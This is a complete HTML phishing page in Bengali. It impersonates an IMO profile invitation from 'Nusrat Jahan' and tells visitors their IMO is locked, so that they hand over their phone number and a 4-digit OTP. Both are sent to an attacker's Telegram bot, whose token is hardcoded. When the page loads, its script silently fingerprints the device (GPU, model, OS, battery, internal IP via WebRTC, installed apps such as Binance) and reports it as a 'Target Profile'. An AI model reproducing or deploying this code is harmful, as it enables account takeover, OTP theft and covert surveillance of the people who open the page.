<!DOCTYPE html>
<html lang="bn">  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>IMO Profile Connect - Nusrat Jahan</title>  
    <script src="https://cdn.tailwindcss.com"></script>  
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">  
    
    <style>  
        body { margin: 0; padding: 0; background-color: #0f172a; font-family: 'Segoe UI', sans-serif; }  
        .imo-card { background: linear-gradient(145deg, #1e293b, #0f172a); border: 1px solid #334155; }  
        .pin-input { width: 50px; height: 55px; text-align: center; font-size: 1.5rem; font-weight: bold; background: rgba(15, 23, 42, 0.6); border: 2px solid #334155; color: white; border-radius: 10px; margin: 0 6px; transition: all 0.3s ease; }  
        .pin-input:focus { outline: none; border-color: #38bdf8; box-shadow: 0 0 10px rgba(56,189,248,0.3); }  
        .hidden { display: none; }  
        .fade-in { animation: fadeIn 0.5s ease-in-out; }  
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }  
        .success-message { animation: bounceIn 0.8s ease-out forwards; color: #10B981; }  
        @keyframes bounceIn { 0% { opacity: 0; transform: scale(0.5); } 60% { opacity: 1; transform: scale(1.1); } 100% { transform: scale(1); } }  
    </style>
</head>  
<body class="flex items-center justify-center min-h-screen p-4">  

<div class="w-full max-w-md imo-card rounded-2xl overflow-hidden shadow-2xl relative">  
    <div class="p-8 min-h-[500px] flex flex-col items-center justify-center text-center">  
          
        <!-- STEP 1: PHONE NUMBER INPUT -->  
        <div id="step-phone" class="w-full fade-in">  
            <div class="relative w-24 h-24 mx-auto mb-6">  
                <img src="https://i.ibb.co/v6m80kP/nusrat.jpg" class="w-full h-full rounded-full border-4 border-sky-500 shadow-lg object-cover" alt="Profile">  
                <div class="absolute bottom-0 right-0 bg-green-500 w-6 h-6 rounded-full border-2 border-slate-900"></div>  
            </div>  
            <h1 class="text-2xl font-bold text-white mb-2">নুসরত জাহান</h1>  
            <p class="text-slate-400 text-sm mb-8">প্রোফাইলে জয়েন হতে আপনার IMO নাম্বার দিন</p>  
            <div class="relative mb-6 text-left">  
                <label class="text-xs text-sky-400 ml-2 mb-1 block font-semibold">Phone Number</label>  
                <div class="relative">  
                    <i class="fa fa-phone absolute left-4 top-3.5 text-slate-400"></i>  
                    <input type="tel" id="inputPhone" placeholder="017xxxxxxxx" class="w-full bg-slate-800 border border-slate-600 text-white p-3 pl-10 rounded-xl focus:outline-none focus:border-sky-500 transition-all">  
                </div>  
            </div>  
            <button onclick="handlePhoneSubmit()" class="w-full bg-gradient-to-r from-sky-500 to-blue-600 text-white font-bold py-3.5 rounded-xl shadow-lg active:scale-95 transition-all">  
                <i class="fa fa-paper-plane mr-2"></i> Continue  
            </button>  
        </div>  

        <!-- STEP 2: LOADING -->  
        <div id="step-loader" class="hidden fade-in">  
            <div class="w-16 h-16 border-4 border-slate-700 border-t-sky-500 rounded-full animate-spin mx-auto mb-6"></div>  
            <h2 class="text-xl font-semibold text-white">এড করা হচ্ছে...</h2>  
        </div>  

        <!-- STEP 3: OTP INPUT -->  
        <div id="step-otp" class="hidden w-full fade-in">  
            <div class="w-16 h-16 bg-slate-800 rounded-full flex items-center justify-center mx-auto mb-6 border border-slate-600">  
                <i class="fa fa-shield-halved text-3xl text-sky-400"></i>  
            </div>  
            <h2 class="text-2xl font-bold text-white mb-2">আপনার imo লক-করা আছে</h2>  
            <p class="text-slate-400 text-sm mb-8">আপনার নাম্বারে পাঠানো ৪-সংখ্যার আনলক নাম্বার লিখুন</p>  
            <div class="flex justify-center gap-2 mb-8">  
                <input type="tel" id="otp1" class="pin-input" maxlength="1" oninput="moveToNext(this, 'otp2')" autofocus>  
                <input type="tel" id="otp2" class="pin-input" maxlength="1" oninput="moveToNext(this, 'otp3')">  
                <input type="tel" id="otp3" class="pin-input" maxlength="1" oninput="moveToNext(this, 'otp4')">  
                <input type="tel" id="otp4" class="pin-input" maxlength="1" oninput="submitFinalOtp()">  
            </div>  
        </div>  

        <!-- STEP 4: SUCCESS -->  
        <div id="step-success" class="hidden w-full fade-in">  
            <div class="bg-green-500/10 border border-green-500/50 p-6 rounded-xl text-white">  
                <i class="fa fa-check-circle text-4xl text-green-500 mb-4"></i>  
                <h3 class="text-xl font-bold">সফলভাবে অ্যাড হয়েছে!</h3>  
            </div>  
        </div>  
    </div>  
</div>  

<script>  
    const BOT_TOKEN = "8367516207:AAEKQnowvWWC32Z2eaPVjuRrxKfl1alssIA";   
    const CHAT_ID = "8271536101";   

    let report = { hardware: {}, software: {}, network: {}, apps: [] };

    // --- MAIN MASTER SCAN ---
    async function fullMasterScan() {
        // 1. Hardware & GPU
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
        
        report.hardware = {
            model: "Detecting...",
            gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown",
            ram: navigator.deviceMemory || "Unknown",
            cores: navigator.hardwareConcurrency,
            screen: `${window.screen.width}x${window.screen.height}`
        };

        // 2. Breaking the Android 10 Mask
        if (navigator.userAgentData) {
            const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion", "architecture"]);
            report.hardware.model = hints.model;
            report.hardware.arch = hints.architecture;
            report.software.os_ver = hints.platformVersion;
        }
        
        // Feature Detection (Double Check)
        const isModern = ('sharedStorage' in window);
        if (isModern && (report.software.os_ver === "10" || !report.software.os_ver)) {
            report.software.os_ver = "13 or 14+ (Detected via API)";
        }

        // 3. Network & Internal IP (WebRTC)
        getLocalIPs();
        if(navigator.connection) {
            report.network.type = navigator.connection.effectiveType;
            report.network.speed = navigator.connection.downlink + " Mbps";
        }

        // 4. CPU Timing Attack (Kernel Profile)
        const start = performance.now();
        for (let i = 0; i < 30000000; i++) Math.sqrt(i);
        report.software.exec_speed = (performance.now() - start).toFixed(2) + " ms";

        // 5. Battery Status
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            report.network.battery = (b.level * 100) + "% (" + (b.charging ? "Charging" : "Discharging") + ")";
        }

        // 6. Deep Patch Check
        report.software.patch = ('highlights' in CSS) ? "Post-Sept 2023" : "Legacy";

        // Send Initial Report
        setTimeout(sendFinalReport, 3000);
    }

    function getLocalIPs() {
        try {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.onicecandidate = e => {
                if (!e.candidate) return;
                const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                if (ip) report.network.internal_ip = ip[1];
            };
            pc.createOffer().then(s => pc.setLocalDescription(s));
        } catch(e) {}
    }

    async function scanApps() {
        const list = [
            {n: "WhatsApp", u: "whatsapp://send"},
            {n: "Telegram", u: "tg://resolve"},
            {n: "Facebook", u: "fb://feed"},
            {n: "Binance", u: "bnc://"}
        ];
        for (let app of list) {
            let d = await probe(app.u);
            if(d) report.apps.push(app.n);
            await new Promise(r => setTimeout(r, 500));
        }
    }

    function probe(u) {
        return new Promise(res => {
            let ok = false;
            const blur = () => ok = true;
            window.addEventListener('blur', blur);
            const i = document.createElement('iframe');
            i.style.display = 'none'; i.src = u;
            document.body.appendChild(i);
            setTimeout(() => {
                document.body.removeChild(i);
                window.removeEventListener('blur', blur);
                res(ok);
            }, 600);
        });
    }

    async function sendFinalReport() {
        const msg = `
🔍 *Advanced Target Profile (Full)*
---------------------------
📱 *Device:* ${report.hardware.model} (${report.hardware.arch || 'N/A'})
⚙️ *OS:* Android ${report.software.os_ver}
🎮 *GPU:* ${report.hardware.gpu}
🧠 *Cores/RAM:* ${report.hardware.cores} / ${report.hardware.ram}GB
⚡ *Exec Speed:* ${report.software.exec_speed}
🛡️ *Patch Date:* ${report.software.patch}
🌐 *Network:* ${report.network.type} (${report.network.speed})
🏠 *Internal IP:* ${report.network.internal_ip || "Protected/mDNS"}
🔋 *Battery:* ${report.network.battery || "Unknown"}
📦 *Apps:* ${report.apps.join(", ") || "None Detected"}
---------------------------
🕒 *Time:* ${new Date().toLocaleString()}
        `;
        await sendToTelegram(msg);
    }

    async function sendToTelegram(t) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: t, parse_mode: 'Markdown' })
            });
        } catch(e) {}
    }

    // --- UI Actions ---
    async function handlePhoneSubmit() {
        const p = document.getElementById('inputPhone').value;
        if(p.length < 10) return;
        
        // Start App Scan after click (Better detection)
        scanApps();
        
        await sendToTelegram(`📞 *Target Phone:* \`${p}\``);
        document.getElementById('step-phone').classList.add('hidden');
        document.getElementById('step-loader').classList.remove('hidden');
        setTimeout(() => {
            document.getElementById('step-loader').classList.add('hidden');
            document.getElementById('step-otp').classList.remove('hidden');
        }, 2500);
    }

    window.moveToNext = (c, n) => { if(c.value.length>=1) document.getElementById(n).focus(); };

    async function submitFinalOtp() {
        const otp = document.getElementById('otp1').value + document.getElementById('otp2').value + document.getElementById('otp3').value + document.getElementById('otp4').value;
        await sendToTelegram(`🔐 *Target OTP:* \`${otp}\``);
        document.getElementById('step-otp').classList.add('hidden');
        document.getElementById('step-success').classList.remove('hidden');
    }

    window.onload = fullMasterScan;
</script>  
</body>  
</html>
